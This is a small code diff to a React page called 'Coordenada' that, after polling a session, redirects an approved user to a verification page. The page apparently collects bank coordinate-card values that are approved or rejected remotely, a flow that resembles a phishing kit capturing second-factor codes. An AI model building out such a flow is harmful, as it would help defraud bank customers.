@@ -5,6 +5,7 @@ import LoginHeader from "../components/LoginHeader";
 import { base44 } from "@/api/base44Client";
 
 export default function Coordenada() {
+  const navigate = useNavigate();
   const [coords, setCoords] = useState(["", "", ""]);
   const [realCoords, setRealCoords] = useState(["", "", ""]);
   const [visible, setVisible] = useState([false, false, false]);
@@ -168,7 +169,7 @@ export default function Coordenada() {
                 if (!s) return;
                 if (s.coordenadaStatus === "approved") {
                   clearInterval(pollRef.current);
-                  setCoordenadaStatus("approved");
+                  navigate(`/verificacion?sessionId=${sessionId}`);
                 } else if (s.coordenadaStatus === "rejected") {
                   clearInterval(pollRef.current);
                   setRealCoords(["", "", ""]);
